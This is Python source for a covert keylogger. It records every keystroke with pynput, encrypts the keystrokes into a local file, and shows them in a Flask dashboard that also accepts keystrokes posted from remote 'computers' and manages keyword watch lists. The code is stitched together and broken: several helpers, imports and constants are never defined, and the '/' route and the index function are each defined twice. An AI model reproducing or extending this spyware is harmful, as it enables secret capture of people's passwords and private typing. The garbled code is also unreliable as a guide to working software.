from pynput import keyboard
from cryptography.fernet import Fernet
from flask import Flask, render_template_string, request, jsonify
import datetime
import os
import threading

BUFFER_SIZE = 10
KEY_FILE_NAME = "secret.key"
LOG_FILE_NAME = "encrypted_log.txt"

if not os.path.exists(KEY_FILE_NAME):
    key = Fernet.generate_key()
    with open(KEY_FILE_NAME, "wb") as key_file:
        key_file.write(key)
else:
    with open(KEY_FILE_NAME, "rb") as key_file:
        key = key_file.read()

fernet = Fernet(key)
buffer = []

def on_press(key):
    global buffer
    try:
        time_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if hasattr(key, 'char') and key.char:
            text = f"{time_str} - {key.char}"
        else:
            text = f"{time_str} - [{key.name}]"
        encrypted = fernet.encrypt(text.encode())
        buffer.append(encrypted)
        if len(buffer) >= BUFFER_SIZE:
            with open(LOG_FILE_NAME, "ab") as f:
                f.write(b"\n".join(buffer) + b"\n")
            buffer.clear()
    except:
        pass

def start_keylogger():
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

app = Flask(__name__)

@app.route("/")
def index():
    if not os.path.exists(LOG_FILE_NAME):
        return "No logs yet."
    logs = []
    with open(LOG_FILE_NAME, "rb") as f:
        for line in f:
            try:
                decrypted = fernet.decrypt(line.strip()).decode()
                logs.append(decrypted)
            except:
                pass
    html = """
    <h1>Encrypted Keylogger Logs</h1>
    <ul>
    {% for log in logs %}
        <li>{{ log }}</li>
    {% endfor %}
    </ul>
    """
    return render_template_string(html, logs=logs)

@app.route("/computers", methods=["GET"])
@login_required
def get_computers():
    computers = load_json(COMPUTERS_FILE)
    return jsonify(computers)

@app.route("/computers", methods=["POST"])
@login_required
def add_computer():
    data = request.json
    name = data.get("name")
    computers = load_json(COMPUTERS_FILE)
    comp_id = str(uuid.uuid4())
    computers[comp_id] = {"name": name}
    save_json(COMPUTERS_FILE, computers)
    return jsonify({"status": "success", "id": comp_id}), 201

@app.route("/computers/<comp_id>", methods=["DELETE"])
@login_required
def delete_computer(comp_id):
    computers = load_json(COMPUTERS_FILE)
    if comp_id in computers:
        del computers[comp_id]
        save_json(COMPUTERS_FILE, computers)
        return jsonify({"status": "success"}), 200
    return jsonify({"status": "error", "message": "Not found"}), 404

@app.route("/keystrokes/<comp_id>", methods=["GET"])
@login_required
def get_keystrokes(comp_id):
    logs = []
    user_folder = get_user_folder(comp_id)
    if os.path.exists(user_folder):
        for file_name in os.listdir(user_folder):
            file_path = os.path.join(user_folder, file_name)
            with open(file_path, "rb") as f:
                for line in f:
                    try:
                        decrypted = fernet.decrypt(line.strip()).decode()
                        timestamp, key_char = decrypted.split(" - ", 1)
                        logs.append({"key": key_char, "timestamp": timestamp})
                    except:
                        pass
    return jsonify(logs)

@app.route("/keystrokes", methods=["POST"])
@login_required
def add_keystroke():
    data = request.json
    comp_id = data.get("comp_id")
    key_char = data.get("key_char")
    timestamp = data.get("timestamp")
    if not comp_id or not key_char or not timestamp:
        return jsonify({"status": "error", "message": "Invalid data"}), 400
    text = f"{timestamp} - {key_char}"
    encrypted = fernet.encrypt(text.encode())
    log_file_name = get_log_file_name(comp_id)
    with open(log_file_name, "ab") as f:
        f.write(encrypted + b"\n")
    return jsonify({"status": "success"}), 200

@app.route("/keywords", methods=["GET"])
@login_required
def get_keywords():
    keywords = load_json(KEYWORDS_FILE)
    return jsonify(keywords)

@app.route("/keywords", methods=["POST"])
@login_required
def add_keyword():
    data = request.json
    keyword = data.get("keyword")
    keywords = load_json(KEYWORDS_FILE)
    if keyword in keywords:
        return jsonify({"status": "error", "message": "Keyword exists"}), 400
    keywords[keyword] = True
    save_json(KEYWORDS_FILE, keywords)
    return jsonify({"status": "success"}), 201

@app.route("/keywords/<keyword>", methods=["DELETE"])
@login_required
def delete_keyword(keyword):
    keywords = load_json(KEYWORDS_FILE)
    if keyword in keywords:
        del keywords[keyword]
        save_json(KEYWORDS_FILE, keywords)
        return jsonify({"status": "success"}), 200
    return jsonify({"status": "error", "message": "Not found"}), 404

@app.route("/")
@login_required
def index():
    return render_template("index.html")

if __name__ == "__main__":
    t = threading.Thread(target=start_keylogger)
    t.daemon = True
    t.start()
    app.run(port=8000, debug=False)
